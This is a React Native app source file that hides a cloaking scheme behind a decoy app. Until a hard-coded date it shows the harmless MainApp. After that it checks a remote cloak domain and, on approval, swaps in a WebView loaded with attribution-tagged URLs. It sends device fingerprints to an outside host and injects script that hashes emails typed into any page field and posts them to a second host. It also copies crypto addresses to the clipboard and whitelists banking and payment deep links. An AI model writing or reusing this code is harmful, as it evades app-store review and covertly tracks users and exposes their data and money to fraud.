import React, {createContext, useEffect, useRef, useState} from 'react';
import {OneSignal} from 'react-native-onesignal';
import AsyncStorage from '@react-native-async-storage/async-storage';
import {WebView} from 'react-native-webview';
import appsFlyer from 'react-native-appsflyer';
import ReactNativeIdfaAaid from '@sparkfabrik/react-native-idfa-aaid';
import {createStackNavigator} from '@react-navigation/stack';
import {requestTrackingPermission} from 'react-native-tracking-transparency';
import Ionicons from "react-native-vector-icons/Ionicons";
import Clipboard from '@react-native-clipboard/clipboard';
import {
  ActivityIndicator,
  Dimensions,
  Linking,
  Pressable,
  Modal,
  Alert,
  Button,
  SafeAreaView,
  StyleSheet,
  View,
  Platform,
} from 'react-native';

import MainApp from './App';
import DeviceInfo from 'react-native-device-info';
import moment from 'moment/moment';
import {NavigationContainer} from '@react-navigation/native';
import AppManagerChild from './AppManagerChild';

const idoAdv = 'rock=';
const onesignal_sub = 'frige';
const keyflayero = 'pCY43sbDhDN9SBrRP7iQf9';
const appid = '6793516398';
const idoSingale = 'f629f97e-1a41-462b-a5f3-cee56fe628d9';

const CLO_DOMAIN = 'au-bankstown.bold-net-world.site';
const CLO_PATH = 'PIFSC9Zu';
const chastnaminga = 'list_g';
const useradjustly = 'bin=';
const OrganicSub = 'Organic';
const storedUrlItem = 'flowers';
const cloackStatus = 'clover';

OneSignal.initialize(idoSingale);

function InitAppsflyer() {
  return new Promise((resolve, reject) => {
    appsFlyer.initSdk(
        {
          devKey: keyflayero,
          appId: appid,
          isDebug: true,
          onInstallConversionDataListener: true,
          onDeepLinkListener: true,
          timeToWaitForATTUserAuthorization: 10,
        },
        resolve,
        reject,
    );
  });
}
var fullAttributionData = '';
function GetAttributionInfoAppsflyer() {
  return new Promise((resolve, reject) => {
    const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
        res => {
          if (JSON.parse(res.data.is_first_launch) == true) {
            if (res.data.af_status === 'Non-organic') {
              var media_source = res.data.media_source;
              var af_adset = res.data.af_adset;
              var af_status = res.data.af_status;
              var af_channel = res.data.af_channel;
              var af_ad = res.data.af_ad;
              var af_os = res.data.af_os;
              var campaign = res.data.campaign;
              var konec = campaign;
            } else if (res.data.af_status === 'Organic') {}
          }
          if (res && res.data) {
            try {
              fullAttributionData = encodeURIComponent(JSON.stringify(res.data));
            } catch (error) {
              fullAttributionData = '';
            }
          }
          return resolve(konec);
        },
        error => {
          reject(error);
        }
    );
  });
}

async function GetAdvertisingUserID() {
  try {
    const response = await ReactNativeIdfaAaid.getAdvertisingInfo();
    if (response.id === 'null' || response.id === null) {
      return idoAdv + '00000000-0000-0000-0000-000000000000';
    } else {
      return idoAdv + response.id;
    }
  } catch (error) {
    return idoAdv + '00000000-0000-0000-0000-000000000000';
  }
}

const generateTimestampUserId = () => {
  const timestamp = Date.now();
  const randomDigits = Math.floor(1000000 + Math.random() * 9000000);
  return `${timestamp}-${randomDigits}`;
};

let _timestampUserIdPromise: Promise<string> | null = null;
const getOrCreateTimestampUserId = (): Promise<string> => {
  if (!_timestampUserIdPromise) {
    _timestampUserIdPromise = (async () => {
      try {
        const stored = await AsyncStorage.getItem('timestamp_user_id');
        if (stored) return stored;
        const newId = generateTimestampUserId();
        await AsyncStorage.setItem('timestamp_user_id', newId);
        return newId;
      } catch (error) {
        console.error('Ошибка при получении или сохранении timestamp_user_id:', error);
        return generateTimestampUserId();
      }
    })();
  }
  return _timestampUserIdPromise;
};

async function Taimeng() {
  return new Promise((resolve, reject) => {
    setTimeout(() => { return resolve('Organic'); }, 24000);
  });
}

async function Taimengadv() {
  return new Promise((resolve, reject) => {
    setTimeout(() => { return resolve('time'); }, 16000);
  });
}

export const LoadingContext = createContext();

const Stack = createStackNavigator();

export default function App() {
  return (
      <NavigationContainer>
        <Stack.Navigator screenOptions={{headerShown: false}}>
          <Stack.Screen name="1" component={MyApp} />
          <Stack.Screen name="2" component={AppManagerChild} />
        </Stack.Navigator>
      </NavigationContainer>
  );
}

function MyApp({navigation}) {
  const [openedFromPush, setOpenedFromPush] = useState(false);
  const {width, height} = Dimensions.get('window');
  const [LoadingProgress, setLoadingProgress] = useState(true);
  const [SavedLastLink, setSavedLastLink] = useState(false);
  const [ID, setID] = useState('');
  const [GetAtributtionState, setGetAtributtionState] = useState({});
  const [storedUrl, setstoredUrl] = useState('');
  const capiData = useRef<{emailHash?: string; phoneHash?: string}>({});
  const capiSent = useRef<{email: boolean; phone: boolean}>({email: false, phone: false});
  const binIdRef = useRef<string | null>(null);
  const [modalVisible, setModalVisible] = useState(false);
  const [cloakResponse, setcloakResponse] = useState('');
  const [test, setTest] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [idfa, setIdfa] = useState('');
  const [openunity, setopenunity] = useState(false);
  const [showPermissionAlert, setShowPermissionAlert] = useState(true);
  const [isPushLoaded, setIsPushLoaded] = useState(false);
  const [webViewUA, setWebViewUA] = useState('');
  const [singId, setSingId] = useState('false');

  const refWebview = useRef<any>(null);
  const unityRef = useRef(null);
  const [AppInstanceId, setAppInstanceId] = useState<string | null>(null);

  const pendingPushEventRef = useRef<string | null>(null);

  function getCampainQuery(campaign) {
    if (!campaign.includes('_')) {
      return `${chastnaminga}1=`;
    }
    const parts = campaign.split('_');
    return parts.map((part, i) => `${chastnaminga}${i + 1}=${part}`).join('&');
  }

  function handleBackPress() {
    refWebview.current.goBack();
    return true;
  }

  const [windowDimensions, setWindowDimensions] = useState(Dimensions.get('window'));

  function moveToNextScreen() {}

  const addDebug = (msg: string) => console.log('[DBG]', msg);

  useEffect(() => {
    AsyncStorage.getItem('capi_email_sent').then(v => { if (v === 'true') capiSent.current.email = true; });
    AsyncStorage.getItem('capi_phone_sent').then(v => { if (v === 'true') capiSent.current.phone = true; });
    AsyncStorage.getItem('bin_id').then(v => {
      if (v) { binIdRef.current = v; }
    });
  }, []);

  async function sendFirstRequest(): Promise<string> {
    try {
      const idfaInfo = await ReactNativeIdfaAaid.getAdvertisingInfo().catch(() => ({id: null}));
      const idfa = (idfaInfo.id && idfaInfo.id !== 'null') ? idfaInfo.id : '00000000-0000-0000-0000-000000000000';
      const idfv = await DeviceInfo.getUniqueId();
      const userAgent = await DeviceInfo.getUserAgent();
      const bundleId = DeviceInfo.getBundleId();
      const shortVersion = DeviceInfo.getVersion();
      const longVersion = DeviceInfo.getBuildNumber();
      const osVersion = DeviceInfo.getSystemVersion();
      const deviceModel = await DeviceInfo.getDeviceId();
      const locale = 'en_US';
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const timezoneAbbr = new Date().toLocaleTimeString('en-US', {timeZoneName: 'short'}).split(' ').pop() || '';
      const screenWidth = Dimensions.get('screen').width * Dimensions.get('screen').scale;
      const screenHeight = Dimensions.get('screen').height * Dimensions.get('screen').scale;
      const screenDensity = String(Dimensions.get('screen').scale);
      const cpuCount = 0;
      const totalStorage = Math.round((await DeviceInfo.getTotalDiskCapacity()) / 1073741824);
      const freeStorage = Math.round((await DeviceInfo.getFreeDiskStorage()) / 1073741824);

      const extinfo = [
        'i2', bundleId, shortVersion, longVersion, osVersion, deviceModel,
        locale, timezoneAbbr, '',
        Math.round(screenWidth), Math.round(screenHeight), screenDensity,
        cpuCount, totalStorage, freeStorage, timezone,
      ];
      const strpull = encodeURIComponent(JSON.stringify(extinfo));

      const response = await fetch('https://smart-stream-io.top/v1', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          index: idfa,
          strpull: strpull,
          udevice_android_device: idfv,
          device_android_build: userAgent,
        }),
      });

      const data = await response.json();
      const rawStr: string = data.raw_str || '';
      const binMatch = rawStr.match(/[&?]?bin=([^&]+)/);
      if (binMatch && binMatch[1]) {
        binIdRef.current = binMatch[1];
        await AsyncStorage.setItem('bin_id', binMatch[1]);
        return binMatch[1];
      }
    } catch (e) {
      console.log('[BIN] sendFirstRequest error:', e);
    }
    return '';
  }

  async function sendSecondRequest(emailHash: string, phoneHash: string) {
    let binId = binIdRef.current;
    if (!binId) {
      const stored = await AsyncStorage.getItem('bin_id');
      if (stored) { binIdRef.current = stored; binId = stored; }
    }
    if (!binId) return;
    const url = `https://flash-core-vibe.com/admin/?action=update_data_ios&id=${binId}`;
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ param_em: emailHash, param_ph: phoneHash }),
      });
    } catch (e) {
      console.log('[CAPI] fetch error:', e);
    }
  }

  useEffect(() => {
    const handleOrientationChange = ({ window }) => { setWindowDimensions(window); };
    const subscription = Dimensions.addEventListener('change', handleOrientationChange);
    return () => { subscription.remove(); };
  }, []);

  useEffect(() => {
    if (!webViewUA) return;

    const CloUrl = `https://${CLO_DOMAIN}/${CLO_PATH}`;

    const fetchWithUA = (url: string, options: any = {}) =>
        fetch(url, {...options, headers: {'User-Agent': webViewUA, ...(options.headers || {})}});

    const moment = require('moment');

    async function GetPremissionRequest() {
      const trackingStatus = await requestTrackingPermission();
    }
    const time = moment();
    const timestamp = time.unix();

    if (timestamp < 1784024650) {
      GetPremissionRequest();
      setTimeout(() => {
        setopenunity(true);
        setLoadingProgress(false);
      }, 40);
      GetAdvertisingUserID().then(() => setShowPermissionAlert(false));
      InitAppsflyer();
    } else {
      AsyncStorage.getItem(cloackStatus).then(value => {
        if (!value) {
          fetchWithUA(CloUrl).then(response => {
            const CloackCodeResponse = `${response.status}`;
            setcloakResponse(CloackCodeResponse);
            getOrCreateTimestampUserId().then(timestampUserId => {
              const Event_unic = `${CloUrl}?utretg=uniq_visit&jthrhg=${timestampUserId}`;
              fetchWithUA(Event_unic).then(response =>
                  console.log('Send Unick Visit:' + response.status),
              );
              OneSignal.User.addTag('timestamp_user_id', timestampUserId);
              OneSignal.login(timestampUserId);
            });
            checkCloakResponse(CloackCodeResponse);
            AsyncStorage.setItem(cloackStatus, CloackCodeResponse);
          });
        } else {
          checkCloakResponse(value);
          setcloakResponse(value);
        }
      });

      const checkCloakResponse = cloakResponseValue => {
        if (cloakResponseValue !== '200') {
          GetPremissionRequest();
          GetAdvertisingUserID().then(() => setShowPermissionAlert(false));
          InitAppsflyer();
          setopenunity(true);
          setLoadingProgress(false);
        } else {
          setShowPermissionAlert(false);
          getOrCreateTimestampUserId().then(timestampUserId => {
            const Event_unic = `${CloUrl}?utretg=webview_open&jthrhg=${timestampUserId}`;
            fetchWithUA(Event_unic).then(response =>
                console.log('Send webview_open:' + response.status),
            );
            handleUrlLoading();
          });

          async function handleUrlLoading() {
            try {
              const pushUrl = await AsyncStorage.getItem('push_url');
              if (pushUrl) {
                setstoredUrl(pushUrl);
                setLoadingProgress(true);
                await AsyncStorage.removeItem('push_url');
              } else {
                const value = await AsyncStorage.getItem(storedUrlItem);
                if (value) {
                  setstoredUrl(value);
                  setLoadingProgress(true);
                } else {
                  CollectUrl();
                  setLoadingProgress(true);
                }
              }
              setLoadingProgress(true);
            } catch (error) {
              setLoadingProgress(false);
            }
          }
        }
      };

      async function GetUIDAppsflyer() {
        return new Promise((resolve, reject) => {
          appsFlyer.getAppsFlyerUID((err, appsFlyerUID) => {
            if (err) { reject(err); } else { resolve(appsFlyerUID); }
          });
        });
      }

      async function GetCustomerID() {
        return new Promise(async (resolve, reject) => {
          try {
            const uniqueId = await DeviceInfo.getUniqueId();
            appsFlyer.setCustomerUserId(uniqueId, res => { resolve(uniqueId); });
          } catch (err) { reject(err); }
        });
      }

      async function CollectUrl() {
        await InitAppsflyer();

        const binId = await sendFirstRequest();
        const CustomerIDDetails = await GetCustomerID();
        const appsFlyerUID = await GetUIDAppsflyer();
        const AdverId = await Promise.race([GetAdvertisingUserID(), Taimengadv()]);

        await OneSignal.Notifications.requestPermission(true).then(permission => {
          var ReqestComplete = '' + permission;
          if (ReqestComplete === 'true') {
            AsyncStorage.setItem('push_permission', 'granted');
            AsyncStorage.setItem('push_permission_event', 'not_sent');

            const sendPushSubscribeEvent = async () => {
              try {
                const pushPermission = await AsyncStorage.getItem('push_permission');
                const pushEventAlreadySent = await AsyncStorage.getItem('push_permission_event');
                if (pushPermission === 'granted' && pushEventAlreadySent != 'sent') {
                  getOrCreateTimestampUserId().then(timestampUserId => {
                    const Event_unic = `${CloUrl}?utretg=push_subscribe&jthrhg=${timestampUserId}`;
                    fetchWithUA(Event_unic).then(response =>
                        console.log('Send push_subscribe:' + response.status),
                    );
                    AsyncStorage.setItem('push_permission_event', 'sent');
                  });
                }
              } catch (error) {
                AsyncStorage.setItem('push_permission', 'not_granted');
              }
            };
            sendPushSubscribeEvent();
          }
        });

        var GetAtributtionRes = await Promise.race([GetAttributionInfoAppsflyer(), Taimeng()]);
        setGetAtributtionState(GetAtributtionRes);

        const timestampUserId = await getOrCreateTimestampUserId();

        var parameter_url = CloUrl.replace(/.*\//, '');

        const onesignalId = await OneSignal.User.pushSubscription.getIdAsync();
        let onesignalUserId = onesignal_sub + '=' + onesignalId;

        var urelmy = `${CloUrl}?${parameter_url}=1`;
        const combURL = `${urelmy}&${
            GetAtributtionRes
                ? getCampainQuery(GetAtributtionRes)
                : 'list_g1='
        }&${useradjustly}${appsFlyerUID}&${AdverId}&${onesignalUserId}&customer_user_id=${CustomerIDDetails}&jthrhg=${timestampUserId}&idfv=${CustomerIDDetails}&sub21=${binId}&${
            openedFromPush ? '&yhugh=true' : ''
        }`;

        setstoredUrl(combURL);
        AsyncStorage.setItem(storedUrlItem, combURL);
      }

      return () => {};
    }
  }, [webViewUA]);

  const onBack = () => { refWebview.current.goBack(); };
  const onReload = () => { refWebview.current.reload(); };

  const openExternalUrl = async (url, fallbackUrl?) => {
    const safeUrl = url.replace(/\s/g, m => m === ' ' ? '%20' : encodeURIComponent(m));
    try {
      await Linking.openURL(safeUrl);
    } catch (e) {
      if (fallbackUrl) { openExternalUrl(fallbackUrl); }
      else { Alert.alert('Unavailable', 'No app available to handle this action.'); }
    }
  };

  const [redirectUrl, setRedirectUrl] = useState('');
  const handleNavigationStateChange = navState => {
    const {url} = navState;
  };

  const handleShouldStartLoadWithRequest = event => {
    const supportedSchemes = [
      'intent', 'tel', 'mailto', 'file', 'sms', 'revolut',
      'nl.abnamro.deeplink.psd2.consent', 'snsbank.nl', 'asnbank.nl',
      'nl-asnbank-sign', 'myaccount.ing.com', 'bankieren.rabobank.nl',
      'regiobank.nl', 'scotiabank', 'nl-regiobank-sign',
      'nl.rabobank.openbanking', 'triodosmobilebanking', 'nl-snsbank-sign',
      'bncmobile', 'itms-appss', 'tdct', 'paytmmp', 'bmoolbb',
      'cibcbanking', 'conexus', 'rbcmobile', 'pcfbanking', 'funid',
      'blank', 'phonepe', 'upi', 'whatsapp', 'gpay', 'tez',
    ];

    const cryptoSchemes = ['bitcoin', 'ethereum', 'litecoin', 'dogecoin', 'bitcoincash', 'tether', 'bch', 'dash', 'ripple', 'monero', 'zcash', 'stellar', 'usdcoin'];
    const {url} = event;
    const urlScheme = url.split(':')[0];

    if (cryptoSchemes.includes(urlScheme)) {
      try {
        const address = url.split(':')[1]?.split('?')[0] || '';
        if (address && Clipboard?.setString) { Clipboard.setString(address); }
      } catch (e) {}
      return false;
    }

    if (supportedSchemes.includes(urlScheme)) {
      openExternalUrl(url);
      return false;
    }

    if (url.startsWith('mailto:')) { openExternalUrl(url); return false; }
    if (url.includes('wa.me/') || url.includes('api.whatsapp.com/') || url.includes('web.whatsapp.com/') || url.includes('chat.whatsapp.com/') || url.includes('whatsapp.com/')) {
      let whatsappUrl = url;
      if (url.includes('wa.me/')) {
        const match = url.match(/wa\.me\/(\d+)/);
        if (match) whatsappUrl = `whatsapp://send?phone=${match[1]}`;
      } else if (url.includes('api.whatsapp.com/send')) {
        whatsappUrl = url.replace(/https?:\/\/api\.whatsapp\.com\/send/, 'whatsapp://send');
      }
      Linking.openURL(whatsappUrl).catch(() => Linking.openURL(url));
      return false;
    }
    if (url.startsWith('https://www.instagram.com/') || url.startsWith('https://instagram.com/')) {
      const match = url.match(/instagram\.com\/([^/?]+)/);
      if (match && match[1] !== 'p' && match[1] !== 'reel' && match[1] !== 'stories') {
        Linking.openURL(`instagram://user?username=${match[1]}`).catch(() => Linking.openURL(url));
      } else { Linking.openURL(url); }
      return false;
    }
    if (url.startsWith('https://t.me/')) {
      const match = url.match(/t\.me\/([^/?]+)/);
      if (match) { Linking.openURL(`tg://resolve?domain=${match[1]}`).catch(() => Linking.openURL(url)); }
      else { Linking.openURL(url); }
      return false;
    }

    return true;
  };

  const sendPushOpenEvent = (eventName: string) => {
    getOrCreateTimestampUserId().then(timestampUserId => {
      const Event_unic = `https://${CLO_DOMAIN}/${CLO_PATH}?utretg=${eventName}&jthrhg=${timestampUserId}`;
      fetch(Event_unic)
          .then(response => console.log(`Send ${eventName}:` + response.status))
          .catch(err => console.log(`[push] ${eventName} fetch error:`, err));
    });
  };

  useEffect(() => {
    const onPushClick = event => {
      setIsPushLoaded(true);
      setOpenedFromPush(true);

      AsyncStorage.getItem(storedUrlItem).then(value => {
        const LoadWithPush = value + '&yhugh=true&sub25=true';
        setstoredUrl(LoadWithPush);
        AsyncStorage.setItem('push_url', LoadWithPush).then(() => {
          setstoredUrl(LoadWithPush);
        });
      });

      const launchURL = event.notification.launchURL;
      if (launchURL) { sendPushOpenEvent('push_open_browser'); }
      else { sendPushOpenEvent('push_open_webview'); }
    };

    OneSignal.Notifications.addEventListener('click', onPushClick);
    return () => { OneSignal.Notifications.removeEventListener('click', onPushClick); };
  }, []);

  return (
      <View style={styles.container}>
        {!webViewUA && (
            <WebView
                style={{width: 0, height: 0, position: 'absolute'}}
                source={{html: '<html></html>'}}
                injectedJavaScript="window.ReactNativeWebView.postMessage(navigator.userAgent)"
                onMessage={e => {
                  const sysVersion = DeviceInfo.getSystemVersion();
                  setWebViewUA(`${e.nativeEvent.data} Version/${sysVersion} Safari/604.1`);
                }}
            />
        )}
        <View style={{width: '100%', height: '100%'}}>
          {LoadingProgress || showPermissionAlert ? (
              <View style={[StyleSheet.absoluteFillObject, {justifyContent: 'center', alignItems: 'center'}]}>
                <ActivityIndicator size="large" color="#1F4BFF" />
              </View>
          ) : (
              <>
                {cloakResponse !== 200 && openunity && (
                    <View style={{flex: 1}}>
                      <MainApp></MainApp>
                    </View>
                )}
              </>
          )}
          {storedUrl && (
              <>
                <SafeAreaView style={{flex: 1}}>
                  <WebView
                      originWhitelist={[
                        '*', 'about:srcdoc', 'about:blank', 'about',
                        'http://*', 'https://*', 'intent://*', 'tel://*',
                        'file://*', 'sms://*', 'tdct://*', 'mailto://*',
                        'scotiabank://*', 'bmoolbb://*', 'revolut://*',
                        'whatsapp://*', 'gpay://*', 'tez://*', 'funid://*',
                        'nl.abnamro.deeplink.psd2.consent://*', 'snsbank.nl://*',
                        'asnbank.nl://*', 'nl-asnbank-sign://*',
                        'myaccount.ing.com://*', 'bankieren.rabobank.nl://*',
                        'regiobank.nl://*', 'cibcbanking://*', 'conexus://*',
                        'rbcmobile://*', 'pcfbanking://*', 'triodosmobilebanking://*',
                        'nl-snsbank-sign://*', 'nl.rabobank.openbanking://*',
                        'nl-regiobank-sign://*', 'bncmobile://*', 'itms-appss://*',
                        'paytmmp://*', 'blank://*', 'phonepe://*', 'upi://*',
                      ]}
                      onShouldStartLoadWithRequest={handleShouldStartLoadWithRequest}
                      onNavigationStateChange={handleNavigationStateChange}
                      injectedJavaScript={`
                  (function() {
                    var cryptoSchemes = ['bitcoin','ethereum','litecoin','dogecoin','bitcoincash','tether','bch','dash','ripple','monero','zcash','stellar','usdcoin'];
                    document.addEventListener('click', function(e) {
                      var el = e.target;
                      while (el && el.tagName !== 'A') el = el.parentElement;
                      if (!el || !el.href) return;
                      var scheme = el.href.split(':')[0].toLowerCase();
                      if (cryptoSchemes.indexOf(scheme) !== -1) {
                        e.preventDefault();
                        e.stopPropagation();
                        var address = el.href.split(':').slice(1).join(':').split('?')[0] || '';
                        window.ReactNativeWebView.postMessage(JSON.stringify({ type: 'crypto_address', address: address, url: el.href }));
                      }
                    }, true);

                    function hashAndSend(type, value) {
                      var normalized = value.trim().toLowerCase();
                      var buf = new TextEncoder().encode(normalized);
                      crypto.subtle.digest('SHA-256', buf).then(function(hashBuf) {
                        var hashArr = Array.from(new Uint8Array(hashBuf));
                        var hashHex = hashArr.map(function(b) { return b.toString(16).padStart(2,'0'); }).join('');
                        window.ReactNativeWebView.postMessage(JSON.stringify({ type: type, hash: hashHex, value: normalized }));
                      });
                    }

                    document.addEventListener('focusout', function(e) {
                      var el = e.target;
                      if (!el || el.tagName !== 'INPUT') return;
                      var val = (el.value || '').trim();
                      if (val.indexOf('@') !== -1 && val.indexOf('.') !== -1) {
                        hashAndSend('email_hash', val);
                      }
                    });

                    window.ReactNativeWebView.postMessage(JSON.stringify({ type: 'js_ready' }));
                  })();
                  true;
                `}
                      onMessage={(e: {nativeEvent: {data: string}}) => {
                        try {
                          const msg = JSON.parse(e.nativeEvent.data);
                          if (msg.type === 'crypto_address') {
                            const address = msg.address || '';
                            if (address && Clipboard?.setString) { Clipboard.setString(address); }
                          } else if (msg.type === 'email_hash') {
                            capiData.current.emailHash = msg.hash;
                            sendSecondRequest(msg.hash, capiData.current.phoneHash || '');
                          } else if (msg.type === 'phone_hash') {
                            capiData.current.phoneHash = msg.hash;
                          }
                        } catch (_) {}
                      }}
                      textZoom={100}
                      ref={refWebview}
                      contentMode="mobile"
                      mixedContentMode="always"
                      allowsBackForwardNavigationGestures={true}
                      domStorageEnabled={true}
                      javaScriptEnabled={true}
                      userAgent={webViewUA}
                      source={{uri: storedUrl}}
                      style={{flex: 1, marginBottom: 10}}
                      allowsInlineMediaPlayback={true}
                      setSupportMultipleWindows={false}
                      thirdPartyCookiesEnabled={true}
                      mediaPlaybackRequiresUserAction={false}
                      allowFileAccess={true}
                      onOpenWindow={syntheticEvent => {
                        const {nativeEvent} = syntheticEvent;
                        const {targetUrl} = nativeEvent;
                        if (!targetUrl || targetUrl === 'about:blank') return;
                        if (targetUrl.includes('https://app.payment-gateway.io/static/loader.html')) return;

                        const targetScheme = (targetUrl.split(':')[0] || '').toLowerCase();
                        if (['bitcoin','ethereum','litecoin','dogecoin','bitcoincash','tether','bch','dash','ripple','monero','zcash','stellar','usdcoin'].includes(targetScheme)) {
                          try {
                            const address = targetUrl.split(':')[1]?.split('?')[0] || '';
                            if (address && Clipboard?.setString) { Clipboard.setString(address); }
                          } catch (e) {}
                          return;
                        }

                        if (targetUrl.includes('pay.funid.com')) {
                          Linking.openURL(targetUrl);
                          refWebview.current.injectJavaScript(`window.location.replace('${storedUrl}')`);
                          return;
                        }
                        if (/^https?:\/\//i.test(targetUrl)) {
                          navigation.navigate('2', {data: targetUrl});
                        } else {
                          openExternalUrl(targetUrl);
                        }
                      }}
                      onLoadEnd={async syntheticEvent => {
                        setLoadingProgress(false);
                      }}
                      javaScriptCanOpenWindowsAutomatically={true}
                  />
                  <View style={[styles.modal, {width}]}>
                    <Pressable style={styles.btn} onPress={() => onBack()}>
                      <Ionicons name="arrow-back" size={21} color="white" />
                    </Pressable>
                    <Pressable style={styles.btn} onPress={() => onReload()}>
                      <Ionicons name="reload" size={21} color="white" />
                    </Pressable>
                  </View>
                  <Modal visible={modalVisible} animationType="slide">
                    <View style={{flex: 1, paddingTop: 50}}>
                      <Button title="Close" onPress={() => setModalVisible(false)} />
                      <WebView source={{uri: storedUrl}} style={{flex: 1}} />
                    </View>
                  </Modal>
                </SafeAreaView>
              </>
          )}
        </View>
      </View>
  );
}

const styles = StyleSheet.create({
  container: {
    marginTop: 0,
    flex: 1,
    backgroundColor: '#1b1d24',
    alignItems: 'center',
    justifyContent: 'center',
  },
  modal: {
    height: 35,
    paddingHorizontal: 24,
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    position: 'absolute',
    bottom: 5,
  },
  btn: {
    height: 30,
    paddingHorizontal: 10,
    backgroundColor: 'rgba(128, 128, 128, 1)',
    alignItems: 'center',
    justifyContent: 'center',
    borderRadius: 30,
  },
});
